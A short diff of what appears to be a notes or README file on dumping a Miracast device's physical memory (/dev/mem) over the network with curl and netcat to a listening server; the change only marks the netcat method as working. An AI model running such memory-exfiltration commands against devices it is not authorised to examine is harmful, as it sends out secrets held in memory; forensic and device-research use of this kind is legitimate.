@@ -7,7 +7,7 @@ Contains:
 
 curl -F file=@/dev/mem http://145.100.102.62:3301/
 
-## Instead, get the cross-compiled netcat binary and try as follows:
+## Instead, get the cross-compiled netcat binary and try as follows: <- This Works flawlessly!
 
 <server> netcat -l 0.0.0.0 3301 | dd of=mem.`date +%Y%m%d_%H%M%S`
 <miracast> dd if=/dev/mem | ./netcat 192.168.203.66 3301 
